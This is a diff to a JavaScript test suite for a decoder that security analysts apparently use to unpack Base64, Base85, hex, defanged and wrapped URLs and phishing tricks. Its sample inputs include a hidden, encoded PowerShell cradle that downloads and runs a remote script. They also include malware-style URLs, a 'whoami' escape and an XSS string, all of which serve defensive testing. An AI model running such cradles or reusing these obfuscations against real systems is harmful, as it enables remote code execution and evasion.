@@ -1,4 +1,4 @@
-// Run with:  node --test tests/
+// Run with:  node --test tests/decoder.test.js
 const test = require('node:test');
 const assert = require('node:assert/strict');
 const zlib = require('node:zlib');
@@ -7,6 +7,10 @@ const { decode } = require('../js/decoder.js');
 const utf16b64 = (s) => Buffer.from(s, 'utf16le').toString('base64');
 const utf8b64 = (s) => Buffer.from(s, 'utf8').toString('base64');
 const CMD = "IEX (New-Object Net.WebClient).DownloadString('http://example.test/a.ps1')";
+
+/* ------------------------------------------------------------------ */
+/* Base64 & PowerShell Tests                                          */
+/* ------------------------------------------------------------------ */
 
 test('PowerShell -EncodedCommand (UTF-16LE)', async () => {
   const r = await decode('powershell.exe -NoP -NonI -W Hidden -enc ' + utf16b64(CMD));
@@ -127,4 +131,121 @@ test('decoded HTML/script is returned as plain text only', async () => {
   const s = '<script>alert(1)</script><img src=x onerror=alert(2)>';
   const r = await decode(utf8b64(s));
   assert.equal(r.output, s);
+});
+
+/* ------------------------------------------------------------------ */
+/* Base85 Tests (Ascii85 & RFC 1924 / Python Base85)                  */
+/* ------------------------------------------------------------------ */
+
+test('Base85: Ascii85 with <~ ... ~> delimiters (auto & explicit)', async () => {
+  // "Hello World" in Ascii85 is <~87cURD]i,"Ebo7~>
+  const r = await decode('<~87cURD]i,"Ebo7~>');
+  assert.equal(r.ok, true);
+  assert.equal(r.output, 'Hello World');
+  assert.equal(r.mode, 'base85');
+});
+
+test('Base85: Ascii85 without delimiters and with z zero-block shortcut', async () => {
+  // "Hello World!" in Ascii85 is 87cURD]i,"Ebo80
+  const r = await decode('87cURD]i,"Ebo80', 'base85');
+  assert.equal(r.ok, true);
+  assert.equal(r.output, 'Hello World!');
+});
+
+test('Base85: RFC 1924 / Python b85encode format', async () => {
+  // "Hello World!" in RFC 1924 / Python b85encode is NM&qnZy;B1a%^NF
+  const r = await decode('NM&qnZy;B1a%^NF', 'base85');
+  assert.equal(r.ok, true);
+  assert.equal(r.output, 'Hello World!');
+  assert.ok(r.steps.some((s) => /RFC 1924/.test(s)));
+});
+
+test('Base85: Auto-detects raw Base85 with punctuation', async () => {
+  const r = await decode('NM&qnZy;B1a%^NF');
+  assert.equal(r.ok, true);
+  assert.equal(r.output, 'Hello World!');
+  assert.equal(r.mode, 'base85');
+});
+
+/* ------------------------------------------------------------------ */
+/* URL / Obfuscated & Defanged URL Tests                              */
+/* ------------------------------------------------------------------ */
+
+test('URL: Defanged URL with hxxps, [:], [.], and percent encoding', async () => {
+  const r = await decode('hxxps[:]//evil-login[.]example[.]com/auth%2Flogin%3Fuser%3Dadmin%2540corp.local');
+  assert.equal(r.ok, true);
+  assert.equal(r.mode, 'url');
+  assert.equal(r.output, 'https://evil-login.example.com/auth/login?user=admin@corp.local');
+  assert.ok(r.steps.includes('Re-fanged indicators'));
+});
+
+test('URL: Unwraps Outlook SafeLinks and decodes target', async () => {
+  const safelink = 'https://nam01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fphish.example.org%2Freset%3Fid%3D42&data=05%7C01';
+  const r = await decode(safelink);
+  assert.equal(r.ok, true);
+  assert.ok(r.output.startsWith('https://phish.example.org/reset?id=42'));
+  assert.ok(r.steps.includes('Outlook SafeLinks unwrapped'));
+});
+
+test('URL: Unwraps Proofpoint URL Defense v2 and v3', async () => {
+  const ppv2 = 'https://urldefense.proofpoint.com/v2/url?u=https-3A__malware.example.com_payload.exe&d=DwMFaQ';
+  const r2 = await decode(ppv2);
+  assert.equal(r2.ok, true);
+  assert.equal(r2.output, 'https://malware.example.com/payload.exe');
+
+  const ppv3 = 'https://urldefense.com/v3/__https://malware.example.com/drop.ps1__;!!AbCdEf!12345$';
+  const r3 = await decode(ppv3);
+  assert.equal(r3.ok, true);
+  assert.equal(r3.output, 'https://malware.example.com/drop.ps1');
+});
+
+test('URL: De-obfuscates Hex, Decimal Dword, and Octal IPv4 hostnames', async () => {
+  const rHex = await decode('http://0x7f000001:8080/shell');
+  assert.equal(rHex.output, 'http://127.0.0.1:8080/shell');
+  assert.ok(rHex.warnings.some((w) => /127\.0\.0\.1/.test(w)));
+
+  const rDword = await decode('http://2130706433/admin');
+  assert.equal(rDword.output, 'http://127.0.0.1/admin');
+
+  const rOctal = await decode('http://0177.0.0.1/test');
+  assert.equal(rOctal.output, 'http://127.0.0.1/test');
+});
+
+test('URL: Warns on "@" credential spoofing phishing trick', async () => {
+  const r = await decode('https://login.microsoft.com@evil-attacker.test/signin', 'url');
+  assert.equal(r.ok, true);
+  assert.ok(r.warnings.some((w) => /Phishing "@" trick detected/.test(w)));
+});
+
+test('URL: Warns on shortened URLs with offline OPSEC note', async () => {
+  const r = await decode('hxxps[:]//bit[.]ly/3xYzAbC');
+  assert.equal(r.ok, true);
+  assert.equal(r.output, 'https://bit.ly/3xYzAbC');
+  assert.ok(r.warnings.some((w) => /Shortened URL detected/.test(w)));
+});
+
+/* ------------------------------------------------------------------ */
+/* Hex & Escape Tests                                                 */
+/* ------------------------------------------------------------------ */
+
+test('Hex: Continuous and space-separated hex strings', async () => {
+  const r1 = await decode('48 65 6c 6c 6f 20 53 4f 43');
+  assert.equal(r1.ok, true);
+  assert.equal(r1.mode, 'hex');
+  assert.equal(r1.output, 'Hello SOC');
+
+  const r2 = await decode('5472794861636b4d65');
+  assert.equal(r2.ok, true);
+  assert.equal(r2.mode, 'hex');
+  assert.equal(r2.output, 'TryHackMe');
+});
+
+test('Hex: \\xNN and \\uNNNN escape sequences', async () => {
+  const rHexEsc = await decode('\\x77\\x68\\x6f\\x61\\x6d\\x69');
+  assert.equal(rHexEsc.ok, true);
+  assert.equal(rHexEsc.output, 'whoami');
+
+  const rUniEsc = await decode('\\u0050\\u006f\\u0077\\u0065\\u0072\\u0053\\u0068\\u0065\\u006c\\u006c');
+  assert.equal(rUniEsc.ok, true);
+  assert.equal(rUniEsc.output, 'PowerShell');
 });
